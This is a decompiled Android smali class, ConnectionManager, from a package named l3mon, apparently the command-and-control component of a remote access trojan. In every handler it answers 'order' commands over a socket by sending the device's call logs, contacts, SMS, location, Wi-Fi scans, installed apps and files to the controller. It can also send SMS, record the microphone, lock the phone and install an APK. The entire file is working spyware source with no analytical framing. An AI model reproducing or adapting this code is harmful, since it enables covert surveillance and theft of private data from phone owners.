.class public Lcom/etechd/l3mon/ConnectionManager;
.super Ljava/lang/Object;
.source "ConnectionManager.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/etechd/l3mon/ConnectionManager$100000000;,
        Lcom/etechd/l3mon/ConnectionManager$100000001;
    }
.end annotation


# static fields
.field public static context:Landroid/content/Context;

.field private static fm:Lcom/etechd/l3mon/FileManager;

.field private static ioSocket:Lio/socket/client/Socket;


# direct methods
.method static final constructor <clinit>()V
    .locals 5

    new-instance v2, Lcom/etechd/l3mon/FileManager;

    move-object v4, v2

    move-object v2, v4

    move-object v3, v4

    invoke-direct {v3}, Lcom/etechd/l3mon/FileManager;-><init>()V

    sput-object v2, Lcom/etechd/l3mon/ConnectionManager;->fm:Lcom/etechd/l3mon/FileManager;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    .line 208
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static CL()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 150
    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xCL"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    invoke-static {}, Lcom/etechd/l3mon/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method public static CO()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 154
    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xCO"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    invoke-static {}, Lcom/etechd/l3mon/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method public static FI(ILjava/lang/String;)V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 128
    move v0, p0

    move-object v1, p1

    move v6, v0

    const/4 v7, 0x0

    if-ne v6, v7, :cond_1

    .line 129
    new-instance v6, Lorg/json/JSONObject;

    move-object v12, v6

    move-object v6, v12

    move-object v7, v12

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    move-object v3, v6

    .line 131
    move-object v6, v3

    :try_start_0
    const-string v7, "type"

    const-string v8, "list"

    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v6

    .line 132
    move-object v6, v3

    const-string v7, "list"

    move-object v8, v1

    invoke-static {v8}, Lcom/etechd/l3mon/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v6

    .line 133
    sget-object v6, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v7, "0xFI"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    const/4 v10, 0x0

    move-object v11, v3

    aput-object v11, v9, v10

    invoke-virtual {v6, v7, v8}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v6

    .line 136
    :cond_0
    :goto_0
    return-void

    .line 133
    :catch_0
    move-exception v6

    move-object v4, v6

    goto :goto_0

    .line 135
    :cond_1
    move v6, v0

    const/4 v7, 0x1

    if-ne v6, v7, :cond_0

    .line 136
    move-object v6, v1

    invoke-static {v6}, Lcom/etechd/l3mon/FileManager;->downloadFile(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public static GP(Ljava/lang/String;)V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 176
    move-object v0, p0

    new-instance v5, Lorg/json/JSONObject;

    move-object v11, v5

    move-object v5, v11

    move-object v6, v11

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    move-object v2, v5

    .line 178
    move-object v5, v2

    :try_start_0
    const-string v6, "permission"

    move-object v7, v0

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v5

    .line 179
    move-object v5, v2

    const-string v6, "isAllowed"

    move-object v7, v0

    invoke-static {v7}, Lcom/etechd/l3mon/PermissionManager;->canIUse(Ljava/lang/String;)Z

    move-result v7

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v5

    .line 180
    sget-object v5, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v6, "0xGP"

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/Object;

    move-object v11, v7

    move-object v7, v11

    move-object v8, v11

    const/4 v9, 0x0

    move-object v10, v2

    aput-object v10, v8, v9

    invoke-virtual {v5, v6, v7}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v5

    :goto_0
    return-void

    :catch_0
    move-exception v5

    move-object v3, v5

    goto :goto_0
.end method

.method public static IN()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 171
    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xIN"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-static {v7}, Lcom/etechd/l3mon/AppList;->getInstalledApps(Z)Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method public static LD()V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 196
    sget-object v2, Lcom/etechd/l3mon/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v2}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    return-void
.end method

.method public static LO()V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 187
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 188
    new-instance v3, Lcom/etechd/l3mon/LocManager;

    move-object v9, v3

    move-object v3, v9

    move-object v4, v9

    sget-object v5, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v4, v5}, Lcom/etechd/l3mon/LocManager;-><init>(Landroid/content/Context;)V

    move-object v1, v3

    .line 190
    move-object v3, v1

    invoke-virtual {v3}, Lcom/etechd/l3mon/LocManager;->canGetLocation()Z

    move-result v3

    if-eqz v3, :cond_0

    .line 191
    sget-object v3, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v4, "0xLO"

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Object;

    move-object v9, v5

    move-object v5, v9

    move-object v6, v9

    const/4 v7, 0x0

    move-object v8, v1

    invoke-virtual {v8}, Lcom/etechd/l3mon/LocManager;->getData()Lorg/json/JSONObject;

    move-result-object v8

    aput-object v8, v6, v7

    invoke-virtual {v3, v4, v5}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v3

    :cond_0
    return-void
.end method

.method public static MI(I)V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I)V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 158
    move v0, p0

    move v3, v0

    invoke-static {v3}, Lcom/etechd/l3mon/MicManager;->startRecording(I)V

    return-void
.end method

.method public static PM()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 166
    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xPM"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    invoke-static {}, Lcom/etechd/l3mon/PermissionManager;->getGrantedPermissions()Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method public static SM(ILjava/lang/String;Ljava/lang/String;)V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 141
    move/from16 v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, p2

    move v6, v0

    const/4 v7, 0x0

    if-ne v6, v7, :cond_1

    .line 142
    sget-object v6, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v7, "0xSM"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    const/4 v10, 0x0

    invoke-static {}, Lcom/etechd/l3mon/SMSManager;->getsms()Lorg/json/JSONObject;

    move-result-object v11

    aput-object v11, v9, v10

    invoke-virtual {v6, v7, v8}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v6

    .line 145
    :cond_0
    :goto_0
    return-void

    .line 143
    :cond_1
    move v6, v0

    const/4 v7, 0x1

    if-ne v6, v7, :cond_0

    .line 144
    move-object v6, v1

    move-object v7, v2

    invoke-static {v6, v7}, Lcom/etechd/l3mon/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v6

    move v4, v6

    .line 145
    sget-object v6, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v7, "0xSM"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    const/4 v10, 0x0

    move v11, v4

    new-instance v12, Ljava/lang/Boolean;

    move v14, v11

    move-object v15, v12

    move-object v11, v15

    move v12, v14

    move-object v13, v15

    move v14, v12

    move-object v15, v13

    move-object v12, v15

    move v13, v14

    invoke-direct {v12, v13}, Ljava/lang/Boolean;-><init>(Z)V

    aput-object v11, v9, v10

    invoke-virtual {v6, v7, v8}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v6

    goto :goto_0
.end method

.method public static UD()V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V^",
            "Ljava/io/IOException;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 201
    new-instance v4, Ljava/io/File;

    move-object v10, v4

    move-object v4, v10

    move-object v5, v10

    const-string v6, "/storage/emulated/0/backups/apps/lemon.apk"

    invoke-direct {v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v1, v4

    .line 202
    move-object v4, v1

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 203
    sget-object v4, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v5, "0xUD"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    const/4 v8, 0x0

    const-string v9, "pandey"

    aput-object v9, v7, v8

    invoke-virtual {v4, v5, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v4

    .line 204
    :cond_0
    new-instance v4, Ljava/io/FileInputStream;

    move-object v10, v4

    move-object v4, v10

    move-object v5, v10

    move-object v6, v1

    invoke-direct {v5, v6}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    move-object v2, v4

    .line 205
    sget-object v4, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v5, "0xUD"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    const/4 v8, 0x0

    const-string v9, "pandey"

    aput-object v9, v7, v8

    invoke-virtual {v4, v5, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v4

    .line 206
    sget-object v4, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    const-string v5, "com.etechd.l3mon"

    move-object v6, v2

    invoke-static {v4, v5, v6}, Lcom/etechd/l3mon/AppUpdate;->installPackage(Landroid/content/Context;Ljava/lang/String;Ljava/io/InputStream;)V

    .line 207
    sget-object v4, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v5, "0xUD"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    const/4 v8, 0x0

    const-string v9, "pandey"

    aput-object v9, v7, v8

    invoke-virtual {v4, v5, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v4

    return-void
.end method

.method public static WI()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 162
    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xWI"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    sget-object v7, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v7}, Lcom/etechd/l3mon/WifiScanner;->scan(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method static synthetic access$L1000000()Lio/socket/client/Socket;
    .locals 3

    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    move-object v0, v2

    return-object v0
.end method

.method static synthetic access$S1000000(Lio/socket/client/Socket;)V
    .locals 4

    move-object v0, p0

    move-object v3, v0

    sput-object v3, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    return-void
.end method

.method public static sendReq()V
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 34
    :try_start_0
    sget-object v3, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    if-eqz v3, :cond_0

    .line 112
    :goto_0
    return-void

    .line 36
    :cond_0
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v3

    invoke-virtual {v3}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v3

    sput-object v3, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    .line 37
    sget-object v3, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v4, "ping"

    new-instance v5, Lcom/etechd/l3mon/ConnectionManager$100000000;

    move-object v7, v5

    move-object v5, v7

    move-object v6, v7

    invoke-direct {v6}, Lcom/etechd/l3mon/ConnectionManager$100000000;-><init>()V

    invoke-virtual {v3, v4, v5}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    move-result-object v3

    .line 46
    sget-object v3, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v4, "order"

    new-instance v5, Lcom/etechd/l3mon/ConnectionManager$100000001;

    move-object v7, v5

    move-object v5, v7

    move-object v6, v7

    invoke-direct {v6}, Lcom/etechd/l3mon/ConnectionManager$100000001;-><init>()V

    invoke-virtual {v3, v4, v5}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    move-result-object v3

    .line 109
    sget-object v3, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {v3}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v3

    .line 112
    :goto_1
    goto :goto_0

    .line 109
    :catch_0
    move-exception v3

    move-object v1, v3

    .line 112
    const-string v3, "error"

    move-object v4, v1

    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    goto :goto_1
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")V"
        }
    .end annotation

    .prologue
    .line 24
    move-object v0, p0

    move-object v4, v0

    :try_start_0
    sput-object v4, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    .line 25
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 27
    :goto_0
    return-void

    .line 25
    :catch_0
    move-exception v4

    move-object v2, v4

    .line 27
    move-object v4, v0

    invoke-static {v4}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V

    goto :goto_0
.end method
